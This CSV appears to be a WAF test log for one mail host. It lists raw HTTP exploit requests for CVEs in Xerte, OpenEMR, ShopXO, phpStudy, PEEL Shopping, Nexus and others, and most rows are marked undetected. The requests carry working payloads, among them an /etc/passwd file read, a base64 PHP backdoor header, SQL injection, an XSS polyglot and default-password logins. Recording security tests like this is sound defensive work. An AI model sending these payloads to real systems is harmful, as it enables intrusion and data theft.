请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 POST /www/website_code/php/properties/media_and_quota_template.php?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 14-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=8d943d18dc7b936b99bb7c5cf08e5a3b-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ntemplate_id=27,/www/website_code/php/properties/media_and_quota_template.php,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
 POST /www/website_code/php/templates/new_template.php?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 77-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=8d943d18dc7b936b99bb7c5cf08e5a3b-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ntutorialid=Nottingham&templatename=Nottingham&tutorialname=exploit&folder_id=,/www/website_code/php/templates/new_template.php,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
 GET /www/?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www/,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
 GET /www?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
 POST /controller/login.php?acao=autenticar&qhaeshs=7069606792363245569 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 40-r-nqhaeshs: 7069606792363245569-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded; charset=UTF-8-r-nX-Requested-With: XMLHttpRequest-r-nCookie: origem_selecionado=ATIVOS; PHPSESSID=5ufshmd6dq2upnutl8b671bja3-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nidusuario='&idsenha=test&tipousr=Usuario,/controller/login.php?acao=autenticar,7069606792363245569,Web应用Virtua SQL 注入漏洞（CVE-2021-37589）,Virtua Cobranca是巴西Virtua公司的一种针对呼叫中心以及收款和财务部门的 CRM 软件。Virtua Cobranca 12R 之前版本存在安全漏洞，该漏洞源于login.php中idusuario参数缺少对于数据的过滤转义。攻击者利用该漏洞可以执行任意SQL语句。,未检测
 POST /controller/origemdb.php?idselorigem=ATIVOS&qhaeshs=7069606792363245569 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069606792363245569-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded; charset=UTF-8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/controller/origemdb.php?idselorigem=ATIVOS,7069606792363245569,Web应用Virtua SQL 注入漏洞（CVE-2021-37589）,Virtua Cobranca是巴西Virtua公司的一种针对呼叫中心以及收款和财务部门的 CRM 软件。Virtua Cobranca 12R 之前版本存在安全漏洞，该漏洞源于login.php中idusuario参数缺少对于数据的过滤转义。攻击者利用该漏洞可以执行任意SQL语句。,未检测
 POST /usercontrol/ajax.aspx?qhaeshs=7069606648020467713 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 48-r-nqhaeshs: 7069606648020467713-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nusername=test1&pwd=123456&Action=post&func=Login,/usercontrol/ajax.aspx,7069606648020467713,Web应用Ecshop SQL注入漏洞_,ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。_checkorder.php存在SQL注入漏洞。,未检测
 POST /usercontrol/ajax.aspx?qhaeshs=7069606648020467713 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 49-r-nqhaeshs: 7069606648020467713-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nusername=master&pwd=123456&Action=post&func=Login,/usercontrol/ajax.aspx,7069606648020467713,Web应用Ecshop SQL注入漏洞_,ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。_checkorder.php存在SQL注入漏洞。,未检测
 GET /zh_cn/webui.html?qhaeshs=7069606545616535553 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606545616535553-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: _WebSessionId_=e0dc7c36a3d4caaeca7661943e42d037-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/zh_cn/webui.html,7069606545616535553,Web应用神州数码DCN路由器弱口令漏洞,神州数码控股有限公司作为联想控股有限公司旗下的子公司之一，是国内最大的IT产品分销商、专业系统集成商和网络产品供应商之一。其旗下产品DCN路由器存在弱口令漏洞，在默认配置下，攻击者可通过弱口令登录其后台。,未检测
 POST /zh_cn/?qhaeshs=7069606545616535553 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 85-r-nqhaeshs: 7069606545616535553-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nselLanguage=2&txtUserName=admin&txtPasswd=admin&subBtn=%25E7%2599%25BB%25E5%25BD%2595,/zh_cn/,7069606545616535553,Web应用神州数码DCN路由器弱口令漏洞,神州数码控股有限公司作为联想控股有限公司旗下的子公司之一，是国内最大的IT产品分销商、专业系统集成商和网络产品供应商之一。其旗下产品DCN路由器存在弱口令漏洞，在默认配置下，攻击者可通过弱口令登录其后台。,未检测
 GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=&qhaeshs=7069606378318331905 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606378318331905-r-nCache-Control: max-age=0-r-nsec-ch-ua: " Not;A Brand";v="99"， "Google Chrome";v="91"， "Chromium";v="91"-r-nsec-ch-ua-mobile: ?0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/91.0.4472.77 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: none-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate， br-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8-r-nCookie: PHPSESSID=c5ftocerp2ujhmfr74jiqdmmei-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=,7069606378318331905,Web应用Shopxo文件读取漏洞（CNVD-2021-15822）,ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。,未检测
 GET /www/delivery/lg.php?dest=http://www.baidu.com&qhaeshs=7069606220948045825 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606220948045825-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/88.0.4324.190 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9-r-nCookie: OAID=a9007bdce33c291658962e937aa06039-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www/delivery/lg.php?dest=http://www.baidu.com,7069606220948045825,Web应用Reviveadserver URL 跳转漏洞（CVE-2021-22873）,Revive Adserver是Revive Adserver团队的一套开源的广告管理系统。该系统提供广告投放、广告位管理、数据统计等功能。Revive Adserver 5.1.0 之前版本存在输入验证错误漏洞，该漏洞源于第三方点击跟踪的重定向不可选择。,未检测
 GET /aes.php?qhaeshs=7069606145173749761 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)-r-nAccept-Encoding: gzip，deflate-r-nAccept: */*-r-nAccept-Charset: PD8gcGhwIHBocGluZm8oKTsgPz4=-r-nqhaeshs: 7069606145173749761-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/aes.php,7069606145173749761,Web应用Phpstudy远程命令执行漏洞,phpStudy是一个PHP调试环境的程序集成包。其存在远程命令执行漏洞，攻击者可通过该漏洞getshell，进而远程执行命令。,未检测
 GET /6.jpg/.php?qhaeshs=7069606135988224001 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606135988224001-r-nCache-Control: max-age=0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/87.0.4280.66 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: none-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate， br-r-nAccept-Language: zh-CN，zh;q=0.9-r-nCookie: JSESSIONID=A576848E5D7B183ABC768A95498FC2E0-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/6.jpg/.php,7069606135988224001,Web应用Phpstudy解析漏洞,phpStudy是一个PHP调试环境的程序集成包。存在 nginx 解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行的影响。,未检测
 GET /pentaho/api/userrolelist/systemRoles?require-cfg.js&qhaeshs=7069606085488803841 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606085488803841-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/pentaho/api/userrolelist/systemRoles?require-cfg.js,7069606085488803841,Web应用Pentaho越权访问漏洞（CVE-2021-31602）,Hitachi Pentaho是日本Hitachi公司的一款用于大数据环境中对数据进行存储和管理的服务。Hitachi Vantara Pentaho 存在授权问题漏洞，该漏洞源于在 Hitachi Vantara Pentaho 通过 9.1 和 Pentaho Business Intelligence Server 通过 7.x 中发现了一个问题。安全模型具有不同的访问控制层。其中一层是 applicationContext 安全性，它在 applicationContext-spring-security.xml 文件中定义。默认配置允许先前不了解平台设置的未经身份验证的用户在不拥有有效凭据的情况下提取信息片段。,未检测
 POST /peel-shopping_9_3_0/utilisateurs/change_params.php?qhaeshs=7069606060427837441 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 497-r-nqhaeshs: 7069606060427837441-r-nCache-Control: max-age=0-r-nsec-ch-ua: "Chromium";v="88"， "Google Chrome";v="88"， ";Not A Brand";v="99"-r-nsec-ch-ua-mobile: ?0-r-nUpgrade-Insecure-Requests: 1-r-nOrigin: http://localhost:12315-r-nContent-Type: application/x-www-form-urlencoded-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/88.0.4324.150 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: same-origin-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nReferer: http://localhost:12315/peel-shopping_9_3_0/utilisateurs/change_params.php-r-nAccept-Encoding: gzip， deflate， br-r-nAccept-Language: zh-CN，zh;q=0.9-r-nCookie: 9d4bb4a09f511681369671a08beff228=toumvbfsej9ml3ktt2n5431nv8; cbb8397765cc3d803684fb20668b3104=6tramqf8apmkf35sprflsdbhl9; JSESSIONID=ADF511356CFAFC073316A4D770A45D0F; sid6b6334df=3n6c86q3gtjrk0op09jekdu4sa-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nemail=857953443%40qq.com&pseudo=jordan&nom_famille=&prenom=&societe=&siret=&intracom_for_billing=&fonction=&telephone=&portable=&adresse=jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliC,/peel-shopping_9_3_0/utilisateurs/change_params.php,7069606060427837441,Web应用Peelshopping跨站脚本注入漏洞（CVE-2021-27190）,Advisto PEEL SHOPPING是一套基于PHP和MySQL的开源电子商务系统。Advisto PEEL SHOPPING 中存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。,未检测
 GET /interface/main/finder/patient_select.php?&findBy=Filter&searchFields=extractvalue(0x0a，concat(0x0a，(md5(891853187))))&qhaeshs=7069605988495523841 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605988495523841-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: OpenEMR=ade8b0b467d2820f78113de0d44a7eed-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/interface/main/finder/patient_select.php?&findBy=Filter&searchFields=extractvalue(0x0a，concat(0x0a，(md5(891853187)))),7069605988495523841,Web应用Openemr SQL 注入漏洞（CVE-2020-29139）,OpenEMR是OpenEMR（Openemr）社区的一套开源的医疗管理系统。该系统可用于医疗实践管理、电子医疗记录、处方书写和医疗帐单申请。OpenEMR中存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。,未检测
 GET /interface/main/tabs/main.php?qhaeshs=7069605988495523841 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605988495523841-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: OpenEMR=ade8b0b467d2820f78113de0d44a7eed-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/interface/main/tabs/main.php,7069605988495523841,Web应用Openemr SQL 注入漏洞（CVE-2020-29139）,OpenEMR是OpenEMR（Openemr）社区的一套开源的医疗管理系统。该系统可用于医疗实践管理、电子医疗记录、处方书写和医疗帐单申请。OpenEMR中存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。,未检测
 POST /interface/main/main_screen.php?auth=login&site=default&qhaeshs=7069605988495523841 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 99-r-nqhaeshs: 7069605988495523841-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnew_login_session_management=1&authProvider=Default&authUser=admin&clearPass=admin&languageChoice=1,/interface/main/main_screen.php?auth=login&site=default,7069605988495523841,Web应用Openemr SQL 注入漏洞（CVE-2020-29139）,OpenEMR是OpenEMR（Openemr）社区的一套开源的医疗管理系统。该系统可用于医疗实践管理、电子医疗记录、处方书写和医疗帐单申请。OpenEMR中存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。,未检测
 POST /service/extdirect/poll/rapture_State_get?qhaeshs=7069605782098018304&qhaeshs=7069605782098018304 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 1397-r-nqhaeshs: 7069605782098018304-r-nqhaeshs: 7069605782098018304-r-nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0-r-nAccept: */*-r-nAccept-Language: en-US，en;q=0.5-r-nAccept-Encoding: gzip， deflate-r-nReferer: http://172.16.101.58:8082/-r-nX-Nexus-UI: true-r-nNX-ANTI-CSRF-TOKEN: 0.42156783346218696-r-nContent-Type: application/x-www-form-urlencoded; charset=UTF-8-r-nX-Requested-With: XMLHttpRequest-r-nCookie: kfNH_2132_saltkey=HNDKrC1d; kfNH_2132_lastvisit=1609395113; kfNH_2132_ulastactivity=6807WJ9Azhd24sWTdADfcFU2K9BS%2Fx6L5IoSXyoYhFtBeg%2B5hflN; NX-ANTI-CSRF-TOKEN=0.42156783346218696; NXSESSIONID=a4e3f422-1745-46a5-af28-10efbdb14b83-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nuiSettings=681843fe3b45f2b6a21c3d0f7a39470e67f110bc&crowd=cf805776b4487003c9d4b255056df602f7d34371&upload=5ffe533b830f08a0326348a9160afafc8ada44db&groupWritableEnabled=5ffe533b830f08a0326348a9160afafc8ada44db&allowScriptCreation=7cb6efb98ba5972a9b5090dc2e517fe14d12cb04&serverId=dc852c1cad688760b42e5623520d30d447bfda50&rebuildingRepositories=97d170e1550eee4afc0af065b78cda302a97674c&api=5ffe533b830f08a0326348a9160afafc8ada44db&health_checks_failed=7cb6efb98ba5972a9b5090dc2e517fe14d12cb04&anonymousUsername=0164dd50523969de34f4d8d75d6cfb46e269fec,/service/extdirect/poll/rapture_State_get,7069605782098018304,Web应用Nexus3 XML实体注入漏洞（CVE-2020-29436）,Sonatype Nexus Repository Manager（NXRM）是美国Sonatype公司的一款存储库管理器，它主要用于管理、存储和分发软件等。Sonatype Nexus Repository Manager 存在安全漏洞，攻击者可利用该漏洞可以向发送恶意XML数据，以读取文件、扫描站点或触发拒绝服务。,检测
